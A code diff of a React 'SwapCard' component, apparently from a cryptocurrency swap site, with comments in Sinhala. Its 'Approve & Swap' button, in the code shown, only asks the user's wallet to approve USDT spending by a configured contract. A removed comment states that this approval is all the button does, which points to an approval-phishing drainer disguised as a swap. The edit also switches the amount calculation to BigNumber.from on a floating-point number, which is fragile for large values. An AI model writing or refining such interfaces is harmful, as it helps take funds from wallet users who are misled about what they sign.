@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { ethers } from 'ethers';
+import { ethers, BigNumber } from 'ethers';
 import { CONFIG, USDT_ABI, TOKEN_LIST, fetchLivePrices } from '../config';
 import TokenModal from './TokenModal';
 import { AreaChart, Area, Tooltip, ResponsiveContainer } from 'recharts';
@@ -88,7 +88,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // Approve & Swap ඔබද්දී වෙන්නේ ඔයාගේ contract එකට USDT approve කරන එක විතරයි
+  // ⭐ මේක තමයි අලුත් ෆන්ක්ෂන් එක. මේකෙන් ඔයාගේ HTML එකේ තියෙන විදිහටම Approve එක ඉල්ලනවා.
   const executeSwap = async () => {
     if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
@@ -101,9 +101,8 @@ export default function SwapCard({ walletAddress, provider }) {
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const decimals = await usdtContract.decimals();
       
-      // String එකක් විදිහටම ගණනය කරමු
-      const amountStr = Math.floor(parseFloat(fromAmount) * 10 ** decimals).toString();
-      const amountWei = ethers.BigNumber.from(amountStr);
+      // BigNumber පාවිච්චි කරලා ගණනය කරමු
+      const amountWei = BigNumber.from(Math.floor(parseFloat(fromAmount) * 10 ** decimals));
 
       const tx = await usdtContract.approve(CONFIG.contractAddress, amountWei);
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
@@ -187,6 +186,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </span>
         </div>
 
+        {/* මේ තමයි අර වෙනම බටන් එක */}
         <button onClick={executeSwap} disabled={isLoading} className="w-full bg-brand-500 hover:bg-brand-600 text-white font-bold py-4 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2">
           <span>{isLoading ? 'Processing...' : 'Approve & Swap'}</span>
         </button>
